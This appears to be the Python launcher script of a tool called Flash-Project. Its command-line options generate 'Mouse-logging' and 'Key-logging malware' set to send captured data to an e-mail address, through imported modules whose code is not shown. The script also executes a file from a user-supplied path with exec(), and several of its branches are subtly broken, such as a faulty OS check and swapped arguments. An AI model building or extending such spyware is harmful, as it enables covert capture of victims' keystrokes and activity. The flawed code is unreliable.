#!/usr/bin/python3
# Shebang, for ./ to work
# (user needs to give flashconsole.py executable permission first:
# bash --> # chmod +x flashconsole.py
# )

# Import necessary modules, libraries and folders
import argparse
import os
import platform
from termcolor import colored
from logger import mouse_logging as mouse_logger
from logger import key_logging as key_logger

installation_path = input(colored('PLEASE ENTER INSTALLATION PATH (Flash-Project Folder)> ', 'blue'))

# Print the beginning
if ('Linux' or 'MacOS') in platform.platform():
      exec(open(installation_path + '/metadata/beginning.txt').read())
else:
      # /home/choki/projects/Flash-Project/metadata/beginning.txt
      exec(open(installation_path + '\\metadata\\beginning.txt').read())

# Create an output folder if it doesnt exist, else print warning
def output_folder(out_file):
      if os.path.exists(out_file):
            print(colored('WARN: Output Folder already exists', 'yellow'))
            print(colored('Continuing...', 'blue'))
      else:
            open(out_file, 'w')

# Create the parser and add arguments
parser = argparse.ArgumentParser()

# 1
parser.add_argument('-o', help='Provide the command with an output folder.')

# 2
parser.add_argument('-ml', help='Create a Mouse-logging malware and send to an E-Mail.')

# 3
parser.add_argument('-kl', help='Create a Key-logging malware and send to an E-Mail.')

# Parse provided arguments
args = parser.parse_args()
# Check the results and run a function accordingly
if args.ml and args.o:
      # 1
      print(colored('DESTINATION > ', 'green') + args.kl)
      print(colored('PATH > ', 'green') + args.o)
      destination = args.ml
      path = str(args.o)
      if ('Linux' or 'MacOS') in platform.platform():
            output_folder_parts  = path.split("/")
      else:
            output_folder_parts  = path.split("\\")
      output_path = path.replace(str(output_folder_parts[-1]), "")
      mouse_logger.create(args.ml, args.o, output_path)

elif args.kl and args.o:
      print(colored('DESTINATION > ', 'green') + args.kl)
      print(colored('PATH > ', 'green') + args.o)
      destination = args.kl
      path = str(args.o)
      if ('Linux' or 'MacOS') in platform.platform():
            output_folder_parts  = path.split("/")
      else:
            output_folder_parts  = path.split("\\")
      output_path = path.replace(str(output_folder_parts[-1]), "")
      key_logger.create(args.ml, args.o, output_path, installation_path)

elif args.o:
      # 2
      output_folder(args.o)
